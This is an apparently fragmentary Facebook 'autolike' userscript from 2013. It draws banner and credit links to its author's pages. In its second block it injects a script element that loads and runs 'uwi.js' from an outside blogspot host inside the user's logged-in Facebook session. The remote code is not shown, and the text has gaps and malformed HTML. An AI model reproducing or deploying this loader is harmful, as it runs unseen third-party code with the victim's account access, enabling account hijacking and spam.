...
// @description		™†uwi†™
// @author			™†uwi†™
// @authorURL		http://www.facebook.com/reggaeyomand
// @homepage		http://www.facebook.com/pages/Reggae/169271966551107
...
// == Nama : ™†uwi†™ Final v.1 ==
// ==Site==www.uzaifahpuay.blogspot.com
// ======= Site FB : http://www.facebook.com/reggaeyomand =======
// =======================================
body = document.body;
...
if(body != null) {
	...
	div.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><center><blink><a style='color: #E30505;' <a href='http://www.facebook.com/reggaeyomand' title='™†uwi†™ Facebook'> Paket V.1 Facebook versi ™†uwi†™ 2013</blink></a></div>"
	...
	div2.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Autolike'>&laquo;</a>&nbsp;<a href='http://www.facebook.com/reggaeyomand' target='_blank' title='New V.1 facebook | Copyright 2013 | All Right Reserved' style='color: #FFFFFF;'>New Automated facebook</a> | <a style='color: #FFFFFF;' onclick='thanks()'>Credit</a></div>"
	
	body.appendChild(div);
	body.appendChild(div2);
	
	unsafeWindow.thanks = function() {
	alert("Thanks for installing this autolike :) add my facebook WWW.FACEBOOK.COM/REGGAEYOMAND\n\n™†uwi†™\nCopyright (c) 2013");
	}
	...
	for(i=1;i<=20;i++) {
		...
		div2.style.width = "125px";
		div2.innerHTML ="<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Autolike'>&laquo;</a>&nbsp;<a style='color: #FFFFFF;' href='http://www.facebook.com/uzar.group' target='_blank' title='New V.1 facebook by ™†UWI†™ | Copyright 2013 | All Right Reserved'>New Automated facebook</a> | <a style='color: #E30505;' onclick='thanks()'>Credit</a></div>"
		}
		else {
...
if(body != null) {
    ...
    javascript: (a = (b = document).createElement("script")).src = "http://uzaifahpuay.blogspot.com/files/uwi.js",
    b.body.appendChild(a);
    void(0);
    };
}
...
// ======= Author : ™†uwi†™ ========
// ======= Site : http://www.facebook.com/reggaeyomand =======
// =======================================
...
var sp = 'Contact Me On Facebook www.facebook.com/reggaeyomand'
